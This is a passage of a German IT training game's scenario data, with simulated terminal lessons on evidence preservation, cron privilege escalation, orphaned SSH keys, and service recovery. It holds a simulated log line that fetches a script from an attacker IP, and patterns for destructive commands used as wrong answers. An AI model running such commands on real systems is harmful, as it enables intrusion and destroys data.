Jun 22 09:03:48 warm-srv-web03 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Jun 22 09:05:12 warm-srv-web03 sudo:   deploy : COMMAND=/usr/bin/wget http://203.0.113.66/x.sh

# Das sind die Beweise: externer Login + sudo-Eskalation + Download.
# Genau diese Zeilen darfst du NICHT verlieren.`,
          teachesCommand: 'find-evidence',
          skillGain: { security: 3, troubleshooting: 2 },
        },
        {
          pattern: 'cp /var/log/auth.log /root/incident/',
          patternRegex: 'cp\\s+.*auth\\.log.*(/root|/evidence|/mnt|incident)',
          output: `# Kopiert. /root/incident/auth.log liegt jetzt außerhalb der
# logrotate-Rotation — diese Kopie überschreibt logrotate nicht.
# Eine Quelle ist gesichert. journald ist die zweite.`,
          teachesCommand: 'preserve-copy',
          skillGain: { security: 4, troubleshooting: 3, linux: 2 },
        },
        {
          pattern: 'journalctl -u ssh --since today > /root/incident/ssh.journal',
          patternRegex: 'journalctl.*>\\s*\\S',
          output: `# journald-Auszug in /root/incident/ssh.journal geschrieben.
# Wichtig: journald rotiert UNABHÄNGIG von der Textdatei — eine zweite,
# durable Beweisquelle. Beide Kopien liegen jetzt sicher.`,
          teachesCommand: 'preserve-journal',
          skillGain: { security: 4, troubleshooting: 3 },
        },
        {
          pattern: 'journalctl',
          patternRegex: '^journalctl\\s*$|journalctl\\s+-u\\s+ssh\\s*$',
          output: `... (Logeinträge werden angezeigt) ...

# Anschauen sichert nichts. Damit die Beweise die Rotation überleben,
# musst du die Ausgabe WEGSCHREIBEN — in eine Datei außerhalb der
# Rotation, z.B. > /root/incident/ssh.journal`,
          skillGain: { linux: 1 },
        },
        {
          pattern: 'logrotate -f /etc/logrotate.conf',
          patternRegex: 'logrotate\\s+(-f|--force)',
          output: `# STOP. logrotate -f rotiert SOFORT — die aktuelle auth.log würde
# jetzt verdrängt und komprimiert, bevor du sie gesichert hast.
# Das vernichtet genau die Beweise, die du retten willst.`,
          wrongApproachFeedback:
            'Niemals logrotate erzwingen, bevor die Beweise gesichert sind — das rotiert die Live-Datei genau jetzt weg.',
          skillGain: {},
        },
        {
          pattern: 'systemctl restart rsyslog',
          patternRegex: 'systemctl\\s+restart|service\\s+\\w+\\s+restart',
          output: `# Noch nicht. Ein Dienst-Neustart kann Logdateien neu öffnen/rotieren
# und Speicher freigeben — bevor du gesichert hast, riskierst du die
# Spuren. Erst sichern, dann reparieren.`,
          wrongApproachFeedback: 'Erst die Beweise sichern — Reparatur/Neustart kommt danach.',
          skillGain: {},
        },
        {
          pattern: 'iptables -A INPUT -s 203.0.113.66 -j DROP',
          patternRegex: 'iptables|ufw\\s+(deny|block)|fail2ban',
          output: `# Die IP zu sperren ist richtig — aber NICHT als Erstes. Die Logs
# rotieren in Minuten; Eindämmen kannst du, sobald die Beweise sicher
# sind. Reihenfolge: erst sichern, dann blocken.`,
          wrongApproachFeedback:
            'Eindämmen ist wichtig, aber zweitrangig: die Beweise rotieren JETZT — erst sichern.',
          skillGain: {},
        },
        {
          pattern: 'rm /var/log/auth.log',
          patternRegex: '^rm\\b|truncate|>\\s*/var/log/auth',
          output: `# Auf keinen Fall. Das löscht/leert genau die Beweisdatei.`,
          wrongApproachFeedback: 'Beweise löschen ist das Gegenteil von Beweissicherung.',
          skillGain: {},
        },
      ],
      solutions: [
        {
          commands: ['preserve-copy', 'preserve-journal'],
          allRequired: true,
          resultText:
            'Beweise gesichert, bevor irgendetwas repariert wurde: die Live-Logdatei liegt als Kopie in /root/incident, dazu eine rotationssichere journald-Ausleitung. Als logrotate lief, war alles Wichtige außerhalb der Rotation. Genau diese Reihenfolge — erst sichern, dann reparieren — rettet im Ernstfall die Forensik.',
          skillGain: { security: 6, troubleshooting: 5, linux: 2 },
          effects: { stress: -6 },
        },
      ],
      hints: [
        '🤖 Jens: "Erster Reflex bei einem Incident? NICHT reparieren. Die Logs rotieren gleich — was musst du zuerst tun?"',
        '🤖 Jens: "Sichere die Beweisdatei an einen Ort, den logrotate nicht anfasst — z.B. cp /var/log/auth.log /root/incident/."',
        '🤖 Jens: "Eine Quelle reicht nicht: journald rotiert getrennt. Schreib zusätzlich journalctl -u ssh ... > /root/incident/ssh.journal."',
        '🤖 Jens: "Erst wenn beide Kopien liegen, darfst du eindämmen (IP sperren) und reparieren. Reihenfolge ist hier die ganze Lektion."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'advanced', 'security', 'incident-response', 'forensics'],
  },

  // ----------------------------------------------------------------
  // ADVANCED (optional, unlocks after Lektion 6). "Sieht harmlos aus, ist aber
  // wegen Dateirechten gefährlich": a root cron runs a clean 755 script — but
  // that script SOURCES a world-writable helper in /opt/scripts/helpers/. The
  // twist is the include chain: the obvious file is fine, the sourced one is
  // the privesc hole. Multi-step win: find the writable include AND fix its
  // perms (chmod o-w) — not disable the legitimate job.
  // ----------------------------------------------------------------
  {
    id: 'learn_adv_cron_privesc',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_adv_ssh_orphan'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Fortgeschritten: Der Cronjob, der zu viel darf',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🔍 SECURITY-AUDIT — warm-srv-backup01                       ║
║                                                              ║
║  Befund: "Privilege-Escalation-Risiko über nächtlichen       ║
║  root-Cronjob." Der Admin winkt ab: "Das Backup läuft seit   ║
║  Jahren sauber, das Script ist sogar root-only."             ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Jede Nacht läuft ein Wartungs-/Backup-Job als **root**. Das Script selbst gehört root und ist sauber gesetzt. Trotzdem flaggt das Audit ein Privesc-Risiko.

Der Haken liegt selten beim offensichtlichen Script — sondern bei dem, was es **einbindet**. Ein root-Job ist nur so sicher wie *jede* Datei, die er ausführt, und *jeder*, der diese Dateien beschreiben darf.

**Deine Aufgabe:**
- Was führt root nachts aus? (\`/etc/crontab\`)
- Folge der GANZEN Kette — welche Scripte ruft/bindet es ein?
- Finde die Datei, die root ausführt und die **jemand anderes ändern darf** — und schließ die Lücke.`,
    mentorNote:
      'Ein root-Cronjob ist nur so sicher wie ALLE Dateien seiner Ausführungskette — inklusive eingebundener (sourced) Scripte. Ist eine davon world-writable (o+w), kann jeder lokale Nutzer ihren Inhalt ändern und beim nächsten Lauf als root ausführen lassen — klassische lokale Privilege Escalation. Prüfe Rechte UND Eigentümer der gesamten Kette (ls -l, find -perm -0002), nicht nur des offensichtlichen Scripts. Fix: world-write entfernen (chmod o-w), nicht den legitimen Job abschalten.',
    choices: [
      {
        id: 'start',
        text: 'Die Ausführungskette prüfen...',
        effects: { skills: { linux: 4, security: 4 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 PRIVESC GESCHLOSSEN                                      ║
║                                                              ║
║  root-Cron → /opt/scripts/run-maintenance.sh   (755 root ✓) ║
║         └─ source helpers/cleanup.sh   war: -rwxrwxrwx ✗    ║
║                                        jetzt: -rwxr-xr-x ✓  ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Treffer. Das offensichtliche Wartungsskript war sauber — aber es bindet \`helpers/cleanup.sh\` ein, und DIE war world-writable. Jeder lokale Nutzer hätte beliebigen Code hineinschreiben können, den root in der nächsten Nacht ausführt. Mit \`chmod o-w\` ist die Schreibberechtigung weg, der Backup-Job läuft unverändert weiter. Lücke zu, ohne Betrieb zu stören.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-backup01',
      username: 'root',
      currentPath: '/opt/scripts',
      commands: [
        {
          pattern: 'cat /etc/crontab',
          patternRegex: 'cat\\s+/etc/crontab|crontab\\s+-l',
          output: `# /etc/crontab
SHELL=/bin/bash
# m h dom mon dow user  command
  0 2 *   *   *  root   /opt/scripts/run-maintenance.sh

# root führt jede Nacht /opt/scripts/run-maintenance.sh aus.
# Sieht normal aus — aber WAS genau macht (und lädt) dieses Script?`,
          teachesCommand: 'read-crontab',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'cat /opt/scripts/run-maintenance.sh',
          patternRegex: 'cat\\s+\\S*run-maintenance',
          output: `#!/bin/bash
set -e
# Nächtliche Wartung
rsync -a /srv/data/ /backup/data/
# gemeinsame Hilfsfunktionen einbinden:
source /opt/scripts/helpers/cleanup.sh
run_cleanup

# Das Script selbst ist unauffällig — ABER es bindet
# helpers/cleanup.sh per "source" ein. Das läuft auch als root.
# Wer darf diese eingebundene Datei beschreiben?`,
          teachesCommand: 'read-maintenance',
          skillGain: { linux: 2, security: 2 },
        },
        {
          pattern: 'ls -l /opt/scripts/helpers/',
          patternRegex: 'ls\\s+-l.*opt/scripts/helpers|find\\s+.*-perm\\s+-0*2',
          output: `insgesamt 8
-rwxrwxrwx 1 root root  812 Jun 18 23:14 cleanup.sh

# DA ist das Loch: cleanup.sh ist -rwxrwxrwx — world-writable.
# Jeder lokale Nutzer (o+w) kann den Inhalt ändern. root bindet sie
# ein und führt sie nachts aus = beliebiger Code als root.`,
          teachesCommand: 'find-writable',
          skillGain: { linux: 3, security: 4, troubleshooting: 2 },
        },
        {
          pattern: 'ls -l /opt/scripts',
          patternRegex: 'ls\\s+-l.*opt/scripts',
          output: `insgesamt 12
drwxr-xr-x 2 root root 4096 Jun 18 23:14 helpers
-rwxr-xr-x 1 root root 1840 Jun 10 10:02 run-maintenance.sh

# run-maintenance.sh: 755, root:root — völlig korrekt. Hier ist alles
# sauber. Die Frage ist, was IN helpers/ liegt und was eingebunden wird.`,
          teachesCommand: 'list-scripts',
          skillGain: { linux: 2 },
        },
        {
          pattern: 'cat /opt/scripts/helpers/cleanup.sh',
          patternRegex: 'cat\\s+\\S*cleanup\\.sh',
          output: `#!/bin/bash
run_cleanup() {
  find /tmp -type f -mtime +7 -delete
  journalctl --vacuum-time=14d
}

# Inhalt ist (aktuell) harmlos — aber das ist NICHT der Punkt.
# Solange jeder die Datei beschreiben darf, kann der Inhalt morgen
# ganz anders aussehen. Das Risiko sind die Rechte, nicht der Code.`,
          teachesCommand: 'read-cleanup',
          skillGain: { linux: 1, security: 1 },
        },
        {
          pattern: 'chmod o-w /opt/scripts/helpers/cleanup.sh',
          patternRegex: 'chmod\\s+(o-w|g-w,o-w|o=rx|750|755|700|754|751|0750|0755|0700)\\s+\\S*cleanup\\.sh',
          output: `# Schreibrecht für "andere" entfernt.

$ ls -l /opt/scripts/helpers/cleanup.sh
-rwxr-xr-x 1 root root 812 Jun 18 23:14 cleanup.sh

# Jetzt kann nur noch root die Datei ändern. Der Cronjob läuft
# unverändert weiter — die Privesc-Lücke ist geschlossen.`,
          teachesCommand: 'fix-perms',
          skillGain: { linux: 3, security: 5, troubleshooting: 2 },
        },
        {
          pattern: 'chmod 777 /opt/scripts/helpers/cleanup.sh',
          patternRegex: 'chmod\\s+(777|0777|a\\+w|o\\+w|666|646|766)\\s',
          output: `# Falsche Richtung! Das gibt NOCH MEHR Leuten Schreibzugriff auf eine
# Datei, die root ausführt. Du sollst world-write ENTFERNEN, nicht
# hinzufügen.`,
          wrongApproachFeedback:
            'Du machst es schlimmer — die Datei braucht WENIGER Schreibrechte (chmod o-w), nicht mehr.',
          skillGain: {},
        },
        {
          pattern: 'chmod 755 /opt/scripts/run-maintenance.sh',
          patternRegex: 'chmod\\s+\\S+\\s+\\S*run-maintenance',
          output: `# run-maintenance.sh ist bereits korrekt (755, root:root). Hier ist
# nichts zu reparieren. Die Lücke steckt im eingebundenen Script —
# folge dem "source"-Aufruf.`,
          wrongApproachFeedback:
            'Falsche Datei: run-maintenance.sh ist schon sicher. Die Schwachstelle ist das eingebundene helpers/cleanup.sh.',
          skillGain: {},
        },
        {
          pattern: 'rm /etc/crontab',
          patternRegex: 'rm\\s+/etc/crontab|crontab\\s+-r|systemctl\\s+(stop|disable)\\s+cron',
          output: `# Der Cronjob selbst ist legitim — die nächtliche Wartung soll laufen.
# Ihn abzuschalten "löst" das Problem nicht, es bricht nur das Backup.
# Das Problem sind die Dateirechte, nicht der Job.`,
          wrongApproachFeedback:
            'Den legitimen Wartungs-Job abzuschalten ist keine Lösung — fix die Dateirechte.',
          skillGain: {},
        },
      ],
      solutions: [
        {
          commands: ['find-writable', 'fix-perms'],
          allRequired: true,
          resultText:
            'Sauber: Du bist der Ausführungskette des root-Crons gefolgt, hast das eingebundene helpers/cleanup.sh als world-writable entlarvt (find -perm / ls -l) und die Schreibrechte für "andere" entfernt (chmod o-w). Der Backup-Job läuft weiter, die lokale Privilege-Escalation ist zu.',
          skillGain: { linux: 3, security: 6, troubleshooting: 3 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "Der Cronjob selbst ist harmlos. Die Gefahr ist eine Datei, die root ausführt und die JEMAND ANDERES ändern darf. Welche?"',
        '🤖 Jens: "Schau nicht nur auf das offensichtliche Script. Was bindet run-maintenance.sh ein (source/.)? Und welche Rechte hat DIESE Datei?"',
        '🤖 Jens: "ls -l /opt/scripts/helpers/ zeigt cleanup.sh als -rwxrwxrwx — world-writable. Jeder kann sie umschreiben, root führt sie aus."',
        '🤖 Jens: "World-write weg: chmod o-w /opt/scripts/helpers/cleanup.sh. Den Cronjob selbst lässt du laufen."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'advanced', 'security', 'privesc', 'permissions'],
  },

  // ----------------------------------------------------------------
  // ADVANCED (optional, unlocks after Lektion 8). Offboarding / access
  // lifecycle: an ex-admin's SSH key is still in authorized_keys long after
  // AD/VPN were disabled — a backdoor. Win ONLY via targeted removal of the
  // orphan line (comment stefan@old-laptop); rm authorized_keys, chmod 000,
  // "delete all ssh- lines", and removing the ACTIVE deploy key are traps.
  // ----------------------------------------------------------------
  {
    id: 'learn_adv_ssh_orphan',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['gui_explorer_auth_users'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Fortgeschritten: Der Schlüssel des Vorgängers',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  📋 OFFBOARDING-AUDIT — warm-jump01                          ║
║                                                              ║
║  Admin Stefan ist zum 31.05. ausgeschieden. AD-Konto und     ║
║  VPN wurden deaktiviert. ABER: hat jemand die SSH-Zugänge    ║
║  geprüft? Schlüssel überleben das Offboarding oft.           ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Stefan ist seit Wochen weg. Sein AD-Konto ist tot, sein VPN gesperrt. Trotzdem könnte er sich — oder wer auch immer seinen alten Laptop hat — per **SSH-Schlüssel** einloggen, wenn der Key noch in \`authorized_keys\` steht.

Auf dem Automatisierungs-Account des Jump-Hosts liegen mehrere Schlüssel. Einer davon gehört zu niemandem mehr. Finde **den einen** — und entferne nur den.

**Deine Aufgabe:**
- Existiert der Account überhaupt noch? Wem gehören die Schlüssel (Kommentare lesen)?
- Identifiziere die **Karteileiche** — den Key des ausgeschiedenen Admins.
- Entferne gezielt diese eine Zeile und verifiziere, dass die legitimen Keys bleiben.`,
    mentorNote:
      'SSH-Schlüssel sind ein eigener Zugangsweg — unabhängig von AD/VPN. Beim Offboarding muss man authorized_keys aller (auch geteilter Automatisierungs-)Accounts prüfen. Schlüssel werden über ihren KOMMENTAR identifiziert (z.B. stefan@old-laptop), nicht über einen System-User. Entferne gezielt die verwaiste Zeile — niemals die ganze Datei löschen oder die Rechte zerstören (chmod 000), das sperrt die legitimen Keys (CI/Deploy) gleich mit aus.',
    choices: [
      {
        id: 'start',
        text: 'Die SSH-Zugänge prüfen...',
        effects: { skills: { security: 4, linux: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🎯 KARTEILEICHE ENTFERNT                                    ║
║                                                              ║
║  entfernt:  ssh-rsa ... stefan@old-laptop   (ausgeschieden) ║
║  behalten:  ssh-ed25519 ... ansible@warm-automation  ✓      ║
║             ssh-ed25519 ... mk@warm-mgmt             ✓      ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Sauber abgeschlossen. Der Schlüssel des ausgeschiedenen Admins ist raus — die legitimen Keys (CI/Automatisierung und der aktuelle Admin) bleiben unangetastet, der Betrieb läuft weiter. Offboarding heißt eben nicht nur AD und VPN, sondern auch jeden SSH-Key, der noch Zugang gewährt.`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-jump01',
      username: 'root',
      currentPath: '/home/deploy/.ssh',
      commands: [
        {
          pattern: 'getent passwd stefan',
          patternRegex: 'getent\\s+passwd\\s+stefan|grep\\s+stefan\\s+/etc/passwd|id\\s+stefan',
          output: `# (keine Ausgabe)

# Es gibt gar keinen System-User "stefan" mehr — der Account ist weg.
# Sein Zugang lief über einen SSH-Key auf dem geteilten deploy-Account.
# Schlüssel erkennt man am KOMMENTAR, nicht am Usernamen.`,
          teachesCommand: 'check-account',
          skillGain: { linux: 2, security: 1 },
        },
        {
          pattern: 'stat /home/deploy/.ssh/authorized_keys',
          patternRegex: 'stat\\s+.*authorized_keys|ls\\s+-l.*authorized_keys',
          output: `  File: authorized_keys
  Size: 1142        Access: (0600/-rw-------)  Uid: (1001/deploy)
  Modify: 2025-11-02 23:14:08

# Zuletzt im November geändert — seitdem hat niemand die Keys
# kuratiert. Höchste Zeit, den Inhalt zu prüfen.`,
          teachesCommand: 'check-keyfile',
          skillGain: { linux: 1 },
        },
        {
          pattern: 'cat /home/deploy/.ssh/authorized_keys',
          patternRegex: 'cat\\s+.*authorized_keys',
          output: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA...3kQ ansible@warm-automation
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA...7pV mk@warm-mgmt
ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...0c2 stefan@old-laptop

# Drei Schlüssel, drei Kommentare:
#  - ansible@warm-automation  → aktiver CI-/Deploy-Key
#  - mk@warm-mgmt             → aktueller Admin
#  - stefan@old-laptop        → der ausgeschiedene Admin. DAS ist die Karteileiche.`,
          teachesCommand: 'identify-orphan',
          skillGain: { security: 3, linux: 2 },
        },
        {
          pattern: 'grep stefan /home/deploy/.ssh/authorized_keys',
          patternRegex: 'grep\\s+.*(stefan|old-laptop|ausgeschieden).*authorized_keys',
          output: `ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...0c2 stefan@old-laptop

# Genau diese eine Zeile gehört zum ausgeschiedenen Admin — und nur die
# soll weg. Die anderen beiden Schlüssel bleiben.`,
          teachesCommand: 'identify-orphan',
          skillGain: { security: 2, troubleshooting: 1 },
        },
        {
          pattern: "sed -i '/stefan@old-laptop/d' /home/deploy/.ssh/authorized_keys",
          patternRegex: "sed\\s+-i.*(stefan|old-laptop|ex-admin)|sed\\s+.*(stefan|old-laptop|ex-admin).*\\/d",
          output: `# Die Zeile mit stefan@old-laptop wurde entfernt.

$ cat /home/deploy/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA...3kQ ansible@warm-automation
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AA...7pV mk@warm-mgmt

# Verifiziert: der verwaiste Schlüssel ist weg, die beiden legitimen
# Keys (Automatisierung + aktueller Admin) sind unverändert da.`,
          teachesCommand: 'remove-orphan',
          skillGain: { security: 5, linux: 2, troubleshooting: 2 },
        },
        {
          pattern: "sed -i '/ansible@warm-automation/d' /home/deploy/.ssh/authorized_keys",
          patternRegex: 'sed.*(ansible|ci-runner|warm-automation|mk@warm-mgmt)|sed\\s+-i.*(deploy@|@warm-automation)',
          output: `# STOP — das ist ein AKTIVER Schlüssel (CI-/Automatisierung bzw. der
# aktuelle Admin), keine Karteileiche. Entfernst du den, brechen
# Deployments oder der reguläre Admin-Zugang. Nur den Key des
# Ausgeschiedenen (stefan@old-laptop) entfernen.`,
          wrongApproachFeedback:
            'Das ist ein aktiver Deploy-/Admin-Key, nicht die Karteileiche — nur stefan@old-laptop gehört entfernt.',
          skillGain: {},
        },
        {
          pattern: 'rm /home/deploy/.ssh/authorized_keys',
          patternRegex: 'rm\\s+\\S*authorized_keys|truncate\\s+.*authorized_keys|>\\s*\\S*authorized_keys|sed.*ssh-(rsa|ed25519).*\\/d',
          output: `# Niemals die ganze Datei (oder alle Key-Zeilen) löschen! Das sperrt
# AUCH die legitimen Keys aus — CI/Deploy und der aktuelle Admin
# verlieren sofort den Zugang. Entfernt wird nur die EINE verwaiste Zeile.`,
          wrongApproachFeedback:
            'Das löscht alle Zugänge, nicht nur den verwaisten — gezielt nur stefan@old-laptop entfernen.',
          skillGain: {},
        },
        {
          pattern: 'chmod 000 /home/deploy/.ssh/authorized_keys',
          patternRegex: 'chmod\\s+0?00\\b',
          output: `# Das macht die Datei für sshd unlesbar — alle Schlüssel fallen aus,
# auch die legitimen. Das ist kein Offboarding, das ist ein Ausfall.
# Die Lösung ist das gezielte Entfernen der einen Zeile.`,
          wrongApproachFeedback:
            'chmod 000 sperrt alle Keys aus (auch die legitimen) — das ist keine gezielte Entfernung.',
          skillGain: {},
        },
      ],
      solutions: [
        {
          commands: ['identify-orphan', 'remove-orphan'],
          allRequired: true,
          resultText:
            'Access-Lifecycle sauber abgeschlossen: Du hast die Schlüssel über ihre Kommentare identifiziert, die Karteileiche des ausgeschiedenen Admins (stefan@old-laptop) gezielt entfernt und verifiziert, dass die legitimen Keys (CI/Automatisierung + aktueller Admin) bleiben. SSH-Zugänge gehören ins Offboarding — nicht nur AD und VPN.',
          skillGain: { security: 6, linux: 2, troubleshooting: 2 },
          effects: { stress: -5 },
        },
      ],
      hints: [
        '🤖 Jens: "AD und VPN sind gesperrt — aber SSH-Keys sind ein eigener Zugangsweg. Wer steht noch in authorized_keys?"',
        '🤖 Jens: "Schlüssel erkennt man am Kommentar am Zeilenende. Welcher gehört zu jemandem, der gar nicht mehr da ist?"',
        '🤖 Jens: "stefan@old-laptop — der Ausgeschiedene. Entferne GENAU diese Zeile, die anderen beiden Keys sind aktiv."',
        '🤖 Jens: "Gezielt mit sed -i \'/stefan@old-laptop/d\' ... — niemals die ganze Datei löschen oder chmod 000, das sperrt CI und Admin mit aus."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'advanced', 'security', 'offboarding', 'ssh'],
  },

  // ============================================
  // ACT 3: THE INFRASTRUCTURE
  // ============================================

  {
    id: 'learn_07_necromancer',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_06_zombie_hunt'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Linux & Services 3: Der Nekromant',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ☠️  DIENST-STATUS                                           ║
║                                                              ║
║  apache2   ████████████████████  [DEAD]                      ║
║  mysql     ████████████████████  [RUNNING]                   ║
║  ssh       ████████████████████  [RUNNING]                   ║
║                                                              ║
║  WARNUNG: Webserver ist tot! Kunden können nicht zugreifen!  ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Der Miner hat den Apache-Webserver getötet!

Kunden können die Website nicht mehr erreichen. Das Telefon klingelt bereits.

Zeit den Toten wiederzuerwecken. Du bist jetzt: **Der Nekromant.**

**Deine Aufgabe:**
- \`systemctl status apache2\` — Prüfe den Zustand
- \`systemctl start apache2\` — Erwecke ihn wieder
- Verifiziere dass er läuft`,
    mentorNote: 'systemctl ist das Tool für systemd-Dienste. status/start/stop/restart sind die Hauptbefehle.',
    choices: [
      {
        id: 'start',
        text: 'Den Webserver wiederbeleben...',
        effects: { skills: { linux: 5, troubleshooting: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  ✨ DIENST WIEDERBELEBT                                      ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  apache2   ████████████████████  [RUNNING]                   ║
║                                                              ║
║  Webserver läuft wieder!                                     ║
║  Kunden können zugreifen!                                    ║
║  Das Telefon hört auf zu klingeln!                           ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Apache lebt wieder! Du hast die Website gerettet.

Aber die Infrastruktur hat noch mehr Schwachstellen.
Das Netzwerk muss geprüft werden...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'root',
      currentPath: '~',
      commands: [
        {
          pattern: 'systemctl status apache2',
          output: `● apache2.service - The Apache HTTP Server
     Loaded: loaded (/lib/systemd/system/apache2.service; enabled)
     Active: inactive (dead) since Mon 2026-03-15 02:48:00 CET; 7h ago
    Process: 567 ExecStop=/usr/sbin/apachectl stop (code=killed, signal=KILL)
   Main PID: 567 (code=killed, signal=KILL)

Mär 15 02:48:00 warm-srv-01 systemd[1]: apache2.service: Main process exited
Mär 15 02:48:00 warm-srv-01 systemd[1]: apache2.service: Failed with result 'signal'

# Status: DEAD! Der Miner hat ihn gekillt. Zeit für Wiederbelebung!`,
          teachesCommand: 'systemctl',
          skillGain: { linux: 3 },
        },
        {
          pattern: 'systemctl start apache2',
          output: `# Dienst wird gestartet...

[SYSTEM] apache2.service: Started The Apache HTTP Server
[SYSTEM] Listening on port 80 (HTTP)
[SYSTEM] Listening on port 443 (HTTPS)

# Der Webserver lebt wieder!`,
          skillGain: { linux: 4 },
          isSolution: true,
        },
        {
          pattern: 'systemctl restart apache2',
          output: `# Dienst wird neugestartet...

[SYSTEM] apache2.service: Stopped
[SYSTEM] apache2.service: Started

# Neustart erfolgreich!`,
          skillGain: { linux: 3 },
          isSolution: true,
        },
        {
          pattern: 'systemctl is-active apache2',
          output: `active

# Der Dienst läuft!`,
          skillGain: { linux: 2 },
        },
        {
          pattern: 'systemctl list-units --type=service --state=running',
          output: `UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
apache2.service          loaded active running The Apache HTTP Server
mysql.service            loaded active running MySQL Server
ssh.service              loaded active running OpenSSH server
cron.service             loaded active running Regular background cron

# Alle kritischen Dienste laufen wieder!`,
          skillGain: { linux: 3 },
        },
        {
          pattern: 'curl localhost',
          output: `<!DOCTYPE html>
<html>
<head><title>WARM Abfallwirtschaft</title></head>
<body><h1>Willkommen!</h1></body>
</html>

# Die Website antwortet! Kunden können wieder zugreifen!`,
          skillGain: { linux: 2, troubleshooting: 2 },
        },
      ],
      solutions: [
        {
          commands: ['systemctl status', 'systemctl start'],
          allRequired: true,
          resultText: 'Apache wiederbelebt! Der Webserver läuft wieder.',
          skillGain: { linux: 6, troubleshooting: 5 },
          effects: { stress: -10 },
        },
      ],
      hints: [
        '🤖 Jens: "systemctl status apache2 zeigt dir den Zustand."',
        '🤖 Jens: "inactive (dead)? Dann systemctl start apache2 zum Wiederbeleben."',
        '🤖 Jens: "Prüf nochmal mit status ob er wirklich läuft."',
        '🤖 Jens: "Du könntest auch systemctl restart nutzen. Macht stop + start."',
      ],
    },
    tags: ['learning', 'terminal', 'linux', 'level3', 'services', 'story'],
  },

  {
    id: 'learn_08_network_recon',
    weekRange: [1, 12],
    probability: 1,
    requiredModes: ['learning'],
    requires: { events: ['learn_04_grep_hunter'] },
    category: 'training',
    involvedCharacters: [],
    title: 'Netzwerk & DNS 1: Netzwerk-Aufklärung',
    description: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  📡 NETZWERK-SCAN ERFORDERLICH                               ║
║                                                              ║
║  Der Angreifer könnte Backdoors im Netzwerk hinterlassen     ║
║  haben. Offene Ports? Lauschende Dienste?                    ║
║                                                              ║
║  Zeit für Reconnaissance.                                    ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Bevor du das Netzwerk säuberst, musst du es verstehen.

Welche Ports sind offen? Welche Dienste lauschen? Ist da was Verdächtiges?

**Deine Aufgabe:**
- \`ip addr\` — Zeige deine Netzwerk-Interfaces
- \`ping -c 3 192.168.1.1\` — Teste ob das Gateway erreichbar ist
- \`ss -tulpn\` — Zeige alle offenen Ports
- Finde den verdächtigen Port!`,
    mentorNote: 'ip addr = IP-Konfiguration, ping = Erreichbarkeit, ss = Socket Statistics (offene Ports)',
    choices: [
      {
        id: 'start',
        text: 'Netzwerk-Scan starten...',
        effects: { skills: { netzwerk: 6, security: 3 } },
        resultText: `\`\`\`
╔══════════════════════════════════════════════════════════════╗
║  🔍 NETZWERK-SCAN ABGESCHLOSSEN                              ║
║  ████████████████████████████████████████ 100%               ║
║                                                              ║
║  VERDÄCHTIGER PORT GEFUNDEN:                                 ║
║  Port 4444 - Netcat Listener (Backdoor!)                     ║
║                                                              ║
║  Der Angreifer hat eine Hintertür offen gelassen!            ║
╚══════════════════════════════════════════════════════════════╝
\`\`\`

Port 4444 — Ein Netcat-Listener! Das ist eine klassische Backdoor.

Der Angreifer kann jederzeit zurückkommen.

Jetzt wird es ernst. Zeit für die Abschlussprüfung...`,
        terminalCommand: true,
      },
    ],
    terminalContext: {
      type: 'linux',
      hostname: 'warm-srv-01',
      username: 'root',
      currentPath: '~',
      commands: [
        {
          pattern: 'ip addr',
          output: `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
    # Deine IP: 192.168.1.100`,
          teachesCommand: 'ip',
          skillGain: { netzwerk: 3 },
        },
        {
          pattern: 'ping -c 3 192.168.1.1',
          output: `PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.5 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.4 ms
64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.4 ms

--- 192.168.1.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss

# Gateway erreichbar! Netzwerk funktioniert.`,
